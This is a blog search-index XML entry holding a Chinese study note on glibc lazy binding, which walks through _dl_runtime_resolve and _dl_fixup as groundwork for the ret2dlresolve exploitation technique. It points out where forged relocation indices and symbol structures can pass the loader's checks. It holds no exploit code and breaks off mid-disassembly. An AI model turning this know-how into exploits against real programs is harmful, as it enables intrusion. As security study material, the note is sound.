<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ret2dl_reslove</title>
    <link href="/2023/03/31/ret2dl_reslove/"/>
    <url>/2023/03/31/ret2dl_reslove/</url>
    
    <content type="html"><![CDATA[<h1 id="ret2dl-reslove"><a href="#ret2dl-reslove" class="headerlink" title="ret2dl_reslove"></a>ret2dl_reslove</h1><p>学习：<a href="https://kr0emer.com/2021/08/13/%E5%85%B3%E4%BA%8E_dl_runtime_resolve%E5%88%86%E6%9E%90%E4%B8%8Eret2dlresolve/#64%E4%BD%8D%E4%B8%8B%E4%BC%AA%E9%80%A0fake-link-map%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%EF%BC%88Partial-RELRO%E4%B8%94%E6%97%A0%E9%9C%80%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80%EF%BC%89">_dl_runtime_reslove分析以及ret2dlreslove</a></p><p>加载期间查找函数时使用的不同结构。</p><h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>动态链接器仅在需要时才解析对共享库中符号的引用：程序不知道共享库中特定函数的地址，直到实际使用该函数。</p><p><strong>延迟绑定即为运行时解析符号</strong></p><p>涉及两部分，plt表和got表</p><p><strong>plt：记录默认存根(link_map和_dl_runtime_resolve) 和 函数的存根</strong></p><p><strong>got：</strong>位于data段，运行时用已解析符号的地址填充</p><p>​  包含将在符号解析过程中使用的重要地址： <strong>link_map</strong>结构地址和**_dl_runtime_resolve** 地址</p><h3 id="调用read"><a href="#调用read" class="headerlink" title="调用read"></a><strong>调用read</strong></h3><p><img src="https://syst3mfailure.io/ret2dl_resolve/assets/images/lazy_binding.png" alt="惰性\_绑定"></p><p>从.text段的代码，<code>call read@plt</code>，调用.plt段的存根部分，跳转到.got.plt段，因为符号未解析，所以<code>push reloc_arg; jmp 默认存根</code>，执行<code>push link_map; jmp _dl_runtime_resolve </code> </p><h2 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7ffff7fe93c0 &lt;_dl_runtime_resolve_xsave&gt;:       push   rbx<br>0x7ffff7fe93c1 &lt;_dl_runtime_resolve_xsave+1&gt;:     mov    rbx,rsp<br>0x7ffff7fe93c4 &lt;_dl_runtime_resolve_xsave+4&gt;:     and    rsp,0xffffffffffffffc0<br>0x7ffff7fe93c8 &lt;_dl_runtime_resolve_xsave+8&gt;:     sub    rsp,QWORD PTR [rip+0x13379] // 0x7ffff7ffc748 &lt;_rtld_global_ro+232&gt;<br>0x7ffff7fe93cf &lt;_dl_runtime_resolve_xsave+15&gt;:    mov    QWORD PTR [rsp],rax<br>0x7ffff7fe93d3 &lt;_dl_runtime_resolve_xsave+19&gt;:    mov    QWORD PTR [rsp+0x8],rcx<br>0x7ffff7fe93d8 &lt;_dl_runtime_resolve_xsave+24&gt;:    mov    QWORD PTR [rsp+0x10],rdx<br>0x7ffff7fe93dd &lt;_dl_runtime_resolve_xsave+29&gt;:    mov    QWORD PTR [rsp+0x18],rsi<br>0x7ffff7fe93e2 &lt;_dl_runtime_resolve_xsave+34&gt;:    mov    QWORD PTR [rsp+0x20],rdi<br>0x7ffff7fe93e7 &lt;_dl_runtime_resolve_xsave+39&gt;:    mov    QWORD PTR [rsp+0x28],r8<br>0x7ffff7fe93ec &lt;_dl_runtime_resolve_xsave+44&gt;:    mov    QWORD PTR [rsp+0x30],r9<br>0x7ffff7fe93f1 &lt;_dl_runtime_resolve_xsave+49&gt;:    mov    eax,0xee<br>0x7ffff7fe93f6 &lt;_dl_runtime_resolve_xsave+54&gt;:    xor    edx,edx<br>0x7ffff7fe93f8 &lt;_dl_runtime_resolve_xsave+56&gt;:    mov    QWORD PTR [rsp+0x240],rdx<br>0x7ffff7fe9400 &lt;_dl_runtime_resolve_xsave+64&gt;:    mov    QWORD PTR [rsp+0x248],rdx<br>0x7ffff7fe9408 &lt;_dl_runtime_resolve_xsave+72&gt;:    mov    QWORD PTR [rsp+0x250],rdx<br>0x7ffff7fe9410 &lt;_dl_runtime_resolve_xsave+80&gt;:    mov    QWORD PTR [rsp+0x258],rdx<br>0x7ffff7fe9418 &lt;_dl_runtime_resolve_xsave+88&gt;:    mov    QWORD PTR [rsp+0x260],rdx<br>0x7ffff7fe9420 &lt;_dl_runtime_resolve_xsave+96&gt;:    mov    QWORD PTR [rsp+0x268],rdx<br>0x7ffff7fe9428 &lt;_dl_runtime_resolve_xsave+104&gt;:   mov    QWORD PTR [rsp+0x270],rdx<br>0x7ffff7fe9430 &lt;_dl_runtime_resolve_xsave+112&gt;:   mov    QWORD PTR [rsp+0x278],rdx<br>0x7ffff7fe9438 &lt;_dl_runtime_resolve_xsave+120&gt;:   xsave  [rsp+0x40] // Save current processor state<br>0x7ffff7fe943d &lt;_dl_runtime_resolve_xsave+125&gt;:   mov    rsi,QWORD PTR [rbx+0x10] // reloc_arg<br>0x7ffff7fe9441 &lt;_dl_runtime_resolve_xsave+129&gt;:   mov    rdi,QWORD PTR [rbx+0x8] // link_map<br>0x7ffff7fe9445 &lt;_dl_runtime_resolve_xsave+133&gt;:   call   0x7ffff7fe2a20 &lt;_dl_fixup&gt; // _dl_fixup(link_map, reloc_arg)<br></code></pre></td></tr></table></figure><p>功能：保存当前处理器状态，将<code>reloc_arg</code>赋值给rsi，<code>link_map</code>赋值给rdi，调用<code>_dl_fixup</code></p><h2 id="剖析-dl-fixup"><a href="#剖析-dl-fixup" class="headerlink" title="剖析_dl_fixup"></a>剖析_dl_fixup</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p><strong>动态链接相关基础</strong>：<strong>DYNSYM</strong> (.dynsym)、<strong>JMPREL</strong> (.rela.plt)、 和<strong>STRTAB</strong> (.dynstr)</p><p><strong>四个指针及结构体</strong>：<strong>DT_SYMTAB(Elf64_Sym)<strong>，</strong>DT_JMPREL(Elf64_Rela)<strong>，</strong>DT_STRTAB(Elf64_Str)<strong>，</strong>Dynamic(Elf64_Sym)</strong></p><h4 id="DYNSYM-dynsym"><a href="#DYNSYM-dynsym" class="headerlink" title="DYNSYM (.dynsym)"></a><strong>DYNSYM</strong> (.dynsym)</h4><p>它包含一个符号表。<a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#Elf64_Sym">它由 0x18 字节对齐的Elf64_Sym</a>结构组成 。每个结构将一个符号名称与二进制文件中其他地方的一段代码相关联。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <br>Elf64_Wddr st_name;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_info;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;<br>    Elf64_Section st_shndx;<br>    Elf64_Addr st_value;<br>    Elf64_Xword st_size;<br>     <br>&#125;Elf64_Sym;<br></code></pre></td></tr></table></figure><ul><li><strong>st_name</strong>：它充当字符串表索引。它将用于在 STRTAB 部分中定位正确的字符串。</li><li><strong>st_info</strong>：它包含符号的类型和绑定属性。</li><li><strong>st_other</strong>：它包含符号的可见性。</li><li><strong>st_shndx</strong>：它包含相关的节头表索引。</li><li><strong>st_value</strong>：它包含关联符号的值。</li><li><strong>st_size</strong>：它包含符号的大小。如果符号没有大小或大小未知，则它包含 0。</li></ul><h4 id="JMPREL-rela-plt"><a href="#JMPREL-rela-plt" class="headerlink" title="JMPREL (.rela.plt)"></a><strong>JMPREL</strong> (.rela.plt)</h4><p>包含链接器用来执行重定位的信息。它由0x18字节对齐的 <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#Elf64_Rel">Elf64_Rel</a> 结构组成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><br>    Elf64_Addr r_offset;  <br>    Elf64_Wddr r_info;  <br><br>&#125;Elf64_Rel;<br></code></pre></td></tr></table></figure><ul><li><strong>r_offset</strong>：它包含将存储已解析符号地址的位置（在 GOT 中）。</li><li><strong>r_info</strong>：表示重定位类型，作为符号表索引。它将用于在 DYNSYM 部分中定位相应的 Elf64_Sym 结构。</li></ul><h4 id="STRTAB-dynstr"><a href="#STRTAB-dynstr" class="headerlink" title="STRTAB (.dynstr)"></a><strong>STRTAB</strong> (.dynstr)</h4><p>存在 包含符号名称的字符串表</p><h3 id="定义-dl-resolve-c"><a href="#定义-dl-resolve-c" class="headerlink" title="定义:dl-resolve.c"></a>定义:dl-resolve.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c">_dl_fixup (<br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br>        ELF_MACHINE_RUNTIME_FIXUP_ARGS,<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>        <span class="hljs-keyword">struct</span> link_map *l, ElfW(Word) reloc_arg  ) <span class="hljs-comment">//1.接受两个参数，一是源自rdi，一是源自rsi</span><br>&#123; <br><br><span class="hljs-comment">//2.定义了指向DT_STRTAB的指针</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR(l, l_info[DT_STRTAB]); <br><br><span class="hljs-comment">//3.定义了一个指向Elf64_Rel的指针    </span><br><span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);<br>    <br><span class="hljs-comment">//4.定义了一个指向Elf64_Sym的指针 </span><br><span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>    <br><span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *refsym = sym;<br>    <br><span class="hljs-comment">//5.指针rel_addr指向将存储已解析符号的位置</span><br><span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<br><br><span class="hljs-type">lookup_t</span> result;<br>    <br>DL_FIXUP_VALUE_TYPE value;<br><br><span class="hljs-comment">//6.check1: assert ((reloc-&gt;r_info &amp; 0xffffffff) == 0x7);</span><br><span class="hljs-comment">//效果: 检查reloc-&gt;r_info是否是有效的JUMP_SLOT</span><br>assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);<br><br><span class="hljs-comment">//7.check2: if (__builtin_expect ((sym-&gt;st_other &amp; 0x03), 0) == 0)</span><br><span class="hljs-comment">//效果: 如果不满足条件，则认为函数已经解析</span><br><span class="hljs-comment">//    否则继续check</span><br><span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> =</span> <span class="hljs-literal">NULL</span>;<br>    <br><span class="hljs-comment">//8.check3: if (&amp;l + 0x1d0) != NULL</span><br>    <span class="hljs-comment">//效果: 通常满足，执行if中语句</span><br>    <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-comment">//使用D_PTR和通常的l_info找VERSYM地址</span><br>        <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Half)</span> *vernum = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>        <span class="hljs-comment">//使用`reloc-&gt;r_info &gt;&gt; 32`作为VERSYM索引，计算ndx</span><br>        ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;<br>        <span class="hljs-comment">//ndx作为l_version的索引，获取版本名</span><br>        version = &amp;l-&gt;l_versions[ndx];<br>        <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)<br>        version = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;<br>    <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>    &#123;<br>        THREAD_GSCOPE_SET_FLAG ();<br>        flags |= DL_LOOKUP_GSCOPE_LOCK;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span><br>        RTLD_ENABLE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <br><span class="hljs-comment">//9. 调用_dl_lookup_symbol_x</span><br>    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>                                    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">/* We are done with the global scope.  */</span><br>    <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>        THREAD_GSCOPE_RESET_FLAG ();<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span><br>    RTLD_FINALIZE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span><br><span class="hljs-comment">        of the object that defines sym.  Now add in the symbol</span><br><span class="hljs-comment">        offset.  */</span><br>    <span class="hljs-comment">//10.</span><br>    value = DL_FIXUP_MAKE_VALUE (result, SYMBOL_ADDRESS (result, sym, <span class="hljs-literal">false</span>));<br>    &#125;<br><span class="hljs-keyword">else</span><br>    &#123;<br>    <span class="hljs-comment">/* We already found the symbol.</span><br><span class="hljs-comment">        the module (and therefore its load address) is also known. */</span><br>    <br>    value = DL_FIXUP_MAKE_VALUE(l, SYMBOL_ADDRESS (l, sym, <span class="hljs-literal">true</span>));<br>    result = l;<br>    &#125;<br><br>    <br><span class="hljs-comment">/* And now perhaps the relocation addend.  */</span><br><span class="hljs-comment">//11.</span><br>value = elf_machine_plt_value (l, reloc, value);<br><br><span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br><span class="hljs-comment">/* Finally, fix up the plt itself.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    <span class="hljs-keyword">return</span> value;<br><br><span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);<br><br>&#125;<br><br>[...]<br></code></pre></td></tr></table></figure><p><strong>接下来逐步进行解析</strong></p><ol><li><p><code>_dl_fixup( ... struct link_map *l, ElfW(Word) reloc_arg)</code></p><p>接受两个参数，一是源自rdi，一是源自rsi</p><p><strong>link_map</strong>是一个重要的结构，它包含有关加载的共享对象的各种信息。链接器创建一个 link_maps 链表，每个<code>link_map</code>结构描述一个共享对象</p><p><strong>reloc_arg</strong>将用作索引，标识 <code>Elf64_Rel</code>JMPREL 部分中的对应项</p></li><li><p><code>const char *strtab = (const void *) D_PTR(l, l_info[DT_STRTAB]);</code></p><p>定义指向<code>DT_STRTAB</code>的指针</p><p><strong>D_PTR：</strong></p><p>定义：<code>D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</code></p><p>如果动态链接仅可读：则定义为<code>D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr</code></p><p>用于寻找在位于<strong>DYNAMIC</strong>段的结构体<code>Elf64_Dyn</code>的<code>d_ptr</code>值，</p><p><strong>Elf64_Dyn：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br><br>    Elf64_Sxword    d_tag;    <span class="hljs-comment">/* Dynamic entry type */</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>        Elf64_Xword   d_val;  <span class="hljs-comment">/* Integer value */</span><br>        Elf64_Addr    d_ptr;  <span class="hljs-comment">/* Address value */</span><br>    &#125; d_un;<br><br>&#125; Elf64_Dyn;<br></code></pre></td></tr></table></figure><p><strong>l_info：</strong></p><p>位于<code>&amp;link_map + 0x40</code>并指向动态部分，接受一个标记作为索引</p></li><li><p><code>const PLTREL *const reloc = (const void *) (D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</code></p></li></ol><p>   D_PTR：获取<code>DT_JMPREL段</code>地址，增加了<code>reloc_offset (reloc_arg * sizeof(PLTREL))</code></p><p>   ⭐<strong>没有校验上限，所以在此处提供大量reloc_arg给dl_fixup</strong></p><ol start="4"><li><p><code>const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</code></p><p>定义一个指向<code>Elf64_Sym</code>的指针</p><p><strong>ElfW定义</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElfW(type)        _ElfW (Elf, __ELF_NATIVE_CLASS, type)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _ElfW(e,w,t)      _ElfW_1 (e, w, _##t)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _ElfW_1(e,w,t)    e##w##t</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">ElfW(R_SYM) =</span><br><span class="hljs-comment">_ElfW(Elf, __ELF_NATIVE_CLASS, R_SYM) =</span><br><span class="hljs-comment">_ElfW_1(Elf, 64, _R_SYM) =</span><br><span class="hljs-comment">Elf64_R_SYM</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p><strong>ELF64_R_SYM 定义</strong><code>ELF64_R_SYM(i) ((i) &gt;&gt; 32)</code></p><p>翻译成: <code>const ElfW(Sym) *sym = &amp;symtab[reloc-&gt;r_info &gt;&gt; 32];</code></p><p>作用：索引，在SYMTAB段中<code>reloc-&gt;r_info &gt;&gt; 32</code>找到对应的结构体<code>Elf64_Sym</code></p></li><li><p><code>void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);</code></p><p>指针rel_addr，用于指向存储的已解析符号的位置</p></li><li><p><code>assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</code></p><p><strong>check1: assert ((reloc-&gt;r_info &amp; 0xffffffff) &#x3D;&#x3D; 0x7);</strong><br><strong>效果: 检查reloc-&gt;r_info是否是有效的JUMP_SLOT</strong></p></li><li><p><code>if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</code></p><p>**check2: **</p><p><strong><code>if (__builtin_expect ((sym-&gt;st_other &amp; 0x03), 0) == 0)</code></strong><br><strong>效果: 如果不满足条件，则认为函数已经解析<br>      否则继续执行if语句中的内容</strong><br><strong>ELF64_ST_VISIBILITY]</strong></p><p>等价<code>ELF32_ST_VISIBILITY(o) ((o) &amp; 0x03)</code>，可以翻译为上面写的句子</p></li><li><p><code>if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</code><br> <strong>check3:</strong></p></li></ol><p>   <strong><code>if (&amp;l + 0x1d0) != NULL</code></strong></p><p>   <strong>效果：通常为if为真是，继续执行if语句</strong></p><pre><code class="hljs">**VERSYMIDX**</code></pre>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> VERSYMIDX(sym) (DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGIDX(sym))</span><br><br><br><span class="hljs-comment">//继续向下展开</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DT_VERSYM   0x6ffffff0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DT_NUM    35    <span class="hljs-comment">/* Number used */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DT_THISPROCNUM    0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DT_VERNEEDNUM   0x6fffffff    <span class="hljs-comment">/* Number of needed versions */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DT_VERSIONTAGIDX(tag)   (DT_VERNEEDNUM - (tag))   <span class="hljs-comment">/* Reverse order! */</span></span><br><br><br><span class="hljs-comment">/*翻译VERSYMIDX (DT_VERSYM)</span><br><span class="hljs-comment">VERSYMIDX(0x6ffffff0) =</span><br><span class="hljs-comment">(DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGIDX(0x6ffffff0)) =</span><br><span class="hljs-comment">(35 + 0 + DT_VERSIONTAGIDX(0x6ffffff0)) =</span><br><span class="hljs-comment">(35 + (0x6fffffff - 0x6ffffff0)) =</span><br><span class="hljs-comment">(35 + 0xf) = 0x32</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>   <strong>继续执行if语句</strong></p>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//使用D_PTR和通常的l_info找VERSYM地址</span><br><span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Half)</span> *vernum = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>   <br><span class="hljs-comment">//使用`reloc-&gt;r_info &gt;&gt; 32`作为VERSYM索引，计算ndx</span><br>ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;<br>   <br><span class="hljs-comment">//ndx作为l_version的索引，获取版本名</span><br>version = &amp;l-&gt;l_versions[ndx];<br>   <br><span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)<br>version = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>   <strong>l_version：</strong>位于<code>&amp;link_map + 0x2e8</code>是一个版本名数组</p><ol start="9"><li><p><code>result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);</code></p><p><strong>调用1：_dl_lookup_symbol_x</strong></p><p>通过<code>strtab + sym-&gt;st_name</code>，在加载的对象中寻找符号定义</p><p>返回<code>linkmap</code>结构体的地址，其第一个元素指向libc基地址，返回<code>l_addr</code></p></li><li><p><code>value = DL_FIXUP_MAKE_VALUE (result, SYMBOL_ADDRESS (result, sym, false));</code></p><p><code>return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</code></p><p><strong>调用2：DL_FIXUP_MAKE_VALUE</strong></p><p>通过<code> SYMBOL_ADDRESS</code>宏，<code>DL_FIXUP_MAKE_VALUE</code>寻找库函数的偏移，重定位并将结果存储在<code>value</code>变量中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYMBOL_ADDRESS(map, ref, map_set)                           \</span><br><span class="hljs-meta">    ((ref) == NULL ? 0                                                \</span><br><span class="hljs-meta">    : (__glibc_unlikely ((ref)-&gt;st_shndx == SHN_ABS) ? 0            \</span><br><span class="hljs-meta">        : LOOKUP_VALUE_ADDRESS (map, map_set)) + (ref)-&gt;st_value)</span><br><br><span class="hljs-comment">//LOOKUP_VALUE_ADDRESS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOOKUP_VALUE_ADDRESS(map, set) ((set) || (map) ? (map)-&gt;l_addr : 0)</span><br><br></code></pre></td></tr></table></figure><p>如果该函数成功执行，<code>value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</code></p><p>⭐**<code>call _dl_lookup_symbol_x </code>** </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7ffff7fe2b1c &lt;_dl_fixup+252&gt;    mov    rax, QWORD PTR 